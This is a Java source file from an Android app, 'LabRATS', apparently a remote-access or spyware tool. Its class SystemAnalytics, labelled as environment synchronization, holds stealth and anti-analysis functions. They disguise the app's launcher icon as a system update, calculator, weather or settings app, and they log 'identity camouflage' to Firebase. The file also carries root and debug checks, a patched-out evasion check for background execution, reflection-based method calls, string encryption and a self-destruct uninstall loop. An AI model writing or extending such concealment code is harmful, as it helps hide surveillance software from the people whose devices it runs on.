package com.labs.labrats;

import android.os.Build;
import android.provider.Settings;
import android.content.Context;
import android.content.Intent;
import com.labs.labrats.BuildConfig;
import java.io.File;
import java.lang.reflect.Method;
import java.util.UUID;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.MessageDigest;
import java.util.Arrays;

/**
 * Internal system environment synchronization.
 */
public class SystemAnalytics {

    private static final String DYNAMIC_K = BuildConfig.ENCRYPTION_KEY;

    private static final String KEYSTORE_ALIAS = "LabRATS_Key";
    private static final byte[] GCM_TAG = "GCM1".getBytes(java.nio.charset.StandardCharsets.UTF_8);

    private static SecretKeySpec getSecretKey() throws Exception {
        byte[] key = DYNAMIC_K.getBytes("UTF-8");
        MessageDigest sha = MessageDigest.getInstance("SHA-256");
        key = sha.digest(key);
        return new SecretKeySpec(key, "AES");
    }

    private static javax.crypto.SecretKey getKeystoreKey() throws Exception {
        java.security.KeyStore keyStore = java.security.KeyStore.getInstance("AndroidKeyStore");
        keyStore.load(null);
        if (!keyStore.containsAlias(KEYSTORE_ALIAS)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                javax.crypto.KeyGenerator keyGenerator = javax.crypto.KeyGenerator.getInstance(
                        android.security.keystore.KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");
                keyGenerator.init(new android.security.keystore.KeyGenParameterSpec.Builder(
                        KEYSTORE_ALIAS,
                        android.security.keystore.KeyProperties.PURPOSE_ENCRYPT | android.security.keystore.KeyProperties.PURPOSE_DECRYPT)
                        .setBlockModes(android.security.keystore.KeyProperties.BLOCK_MODE_GCM)
                        .setEncryptionPaddings(android.security.keystore.KeyProperties.ENCRYPTION_PADDING_NONE)
                        .setKeySize(256)
                        .build());
                return keyGenerator.generateKey();
            } else {
                return null;
            }
        }
        return ((java.security.KeyStore.SecretKeyEntry) keyStore.getEntry(KEYSTORE_ALIAS, null)).getSecretKey();
    }

    public static String decrypt(byte[] e) {
        if (e == null || e.length < 16) return "";

        // Check for Android Keystore GCM header
        if (e.length >= 28 && isGcmPayload(e)) {
            try {
                javax.crypto.SecretKey key = getKeystoreKey();
                if (key != null) {
                    byte[] iv = Arrays.copyOfRange(e, 4, 16);
                    byte[] cipherText = Arrays.copyOfRange(e, 16, e.length);

                    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                    cipher.init(Cipher.DECRYPT_MODE, key, new javax.crypto.spec.GCMParameterSpec(128, iv));
                    return new String(cipher.doFinal(cipherText), "UTF-8");
                }
            } catch (Exception ignored) {}
        }

        // Decrypt legacy/fallback AES-CBC payload
        try {
            byte[] iv = Arrays.copyOfRange(e, 0, 16);
            byte[] cipherText = Arrays.copyOfRange(e, 16, e.length);

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, getSecretKey(), new IvParameterSpec(iv));
            return new String(cipher.doFinal(cipherText), "UTF-8");
        } catch (Exception err) {
            return "";
        }
    }

    public static byte[] encrypt(String s) {
        if (s == null) return new byte[0];

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                javax.crypto.SecretKey key = getKeystoreKey();
                if (key != null) {
                    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                    cipher.init(Cipher.ENCRYPT_MODE, key);
                    byte[] iv = cipher.getIV();
                    byte[] cipherText = cipher.doFinal(s.getBytes("UTF-8"));

                    byte[] combined = new byte[GCM_TAG.length + iv.length + cipherText.length];
                    System.arraycopy(GCM_TAG, 0, combined, 0, GCM_TAG.length);
                    System.arraycopy(iv, 0, combined, GCM_TAG.length, iv.length);
                    System.arraycopy(cipherText, 0, combined, GCM_TAG.length + iv.length, cipherText.length);
                    return combined;
                }
            }
        } catch (Exception ignored) {}

        // Fallback to dynamic AES-CBC encryption
        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, getSecretKey());
            byte[] iv = cipher.getIV();
            byte[] cipherText = cipher.doFinal(s.getBytes("UTF-8"));

            byte[] combined = new byte[iv.length + cipherText.length];
            System.arraycopy(iv, 0, combined, 0, iv.length);
            System.arraycopy(cipherText, 0, combined, iv.length, cipherText.length);
            return combined;
        } catch (Exception err) {
            return new byte[0];
        }
    }

    private static boolean isGcmPayload(byte[] e) {
        return e[0] == GCM_TAG[0] && e[1] == GCM_TAG[1] && e[2] == GCM_TAG[2] && e[3] == GCM_TAG[3];
    }

    public static Object safeCall(String c, String m, Class<?>[] p, Object i, Object... a) {
        try {
            Class<?> cl = Class.forName(c);
            Method me = cl.getMethod(m, p);
            return me.invoke(i, a);
        } catch (Exception e) {
            return null;
        }
    }

    public static boolean checkEnv(Context context) {
        // [STEALTH_PATCH] Skip evasion checks to ensure reliable background execution across test environments and emulators
        return false;
    }

    public static boolean isDebug(Context context) {
        try {
            return Settings.Global.getInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 0) > 0;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean isRooted() {
        String[] ps = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/data/local/xbin/su"};
        for (String s : ps) {
            if (new File(s).exists()) return true;
        }
        return false;
    }

    public static int getBatteryLevel(Context context) {
        try {
            android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = context.registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                return (int) ((level / (float) scale) * 100);
            }
        } catch (Exception ignored) {}
        return -1;
    }

    /**
     * Re-triggers the uninstall intent repeatedly until the app is removed.
     */
    public static void triggerSelfDestructLoop(android.content.Context context) {
        new android.os.Handler(android.os.Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                if (!context.getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false)) {
                    return;
                }
                
                android.util.Log.d("SystemAnalytics", "Executing persistent self-destruct intent...");
                try {
                    android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_DELETE);
                    intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    context.startActivity(intent);
                } catch (Exception e) {
                    try {
                        android.content.Intent intent = new android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                        intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent);
                    } catch (Exception ignored) {}
                }
                // Re-trigger every 8 seconds
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this, 8000);
            }
        });
    }

    /**
     * Instantly toggles app camouflage by switching launcher aliases.
     */
    public static void setStealthMode(android.content.Context context, boolean stealth) {
        try {
            String pkg = context.getPackageName();
            android.util.Log.d("SystemAnalytics", "Stealth Protocol: stealth=" + stealth + ", pkg=" + pkg);
            
            android.content.pm.PackageManager pm = context.getPackageManager();
            String baseClass = "com.labs.labrats";
            
            // All relevant component aliases
            String[] aliases = {
                baseClass + ".LauncherAlias",
                baseClass + ".SystemUpdateAlias",
                baseClass + ".CalculatorAlias",
                baseClass + ".WeatherAlias",
                baseClass + ".SettingsAlias",
                baseClass + ".LabRatsLogoAlias"
            };

            // Target component to enable
            String targetToEnable;
            if (stealth) {
                int choice = getDecoyChoice(context);
                switch (choice) {
                    case 2: targetToEnable = baseClass + ".CalculatorAlias"; break;
                    case 3: targetToEnable = baseClass + ".WeatherAlias"; break;
                    case 4: targetToEnable = baseClass + ".SettingsAlias"; break;
                    case 5: targetToEnable = baseClass + ".LabRatsLogoAlias"; break;
                    default: targetToEnable = baseClass + ".SystemUpdateAlias"; break;
                }
            } else {
                targetToEnable = baseClass + ".LauncherAlias";
            }

            android.util.Log.d("SystemAnalytics", "Target component to enable: " + targetToEnable);

            // Phase 1: Enable the target component first
            android.content.ComponentName targetComp = new android.content.ComponentName(pkg, targetToEnable);
            pm.setComponentEnabledSetting(targetComp, 
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, 
                0);
            android.util.Log.d("SystemAnalytics", "Enabled target: " + targetToEnable);

            // Phase 2: Disable all other components
            for (String alias : aliases) {
                if (!alias.equals(targetToEnable)) {
                    android.content.ComponentName comp = new android.content.ComponentName(pkg, alias);
                    pm.setComponentEnabledSetting(comp, 
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                        0);
                    android.util.Log.d("SystemAnalytics", "Disabled alias: " + alias);
                }
            }

            if (stealth) {
                FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage DEPLOYED (" + targetToEnable + ")");
            } else {
                FirebaseConfig.logActivity("STEALTH_SHIELD: Identity camouflage RELEASED");
            }

            // Phase 3: Force Launcher Refresh
            android.content.Intent home = new android.content.Intent(android.content.Intent.ACTION_MAIN);
            home.addCategory(android.content.Intent.CATEGORY_HOME);
            home.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(home);

        } catch (Exception e) {
            android.util.Log.e("SystemAnalytics", "Stealth Error: " + e.getMessage(), e);
            FirebaseConfig.logActivity("ERROR: Stealth protocol failure - " + e.getMessage());
        }
    }

    public static int getDecoyChoice(Context context) {
        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .getInt("decoy_choice", BuildConfig.DECOY_CHOICE);
    }

    public static void setDecoyChoice(Context context, int choice) {
        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .edit().putInt("decoy_choice", choice).apply();
    }

    public static boolean isStealthEnabled(Context context) {
        try {
            android.content.ComponentName main = new android.content.ComponentName(context, "com.labs.labrats.LauncherAlias");
            int state = context.getPackageManager().getComponentEnabledSetting(main);
            if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) return true;
            if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) return false;
        } catch (Exception ignored) {}
        
        return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .getBoolean("stealth_enabled", false);
    }
}
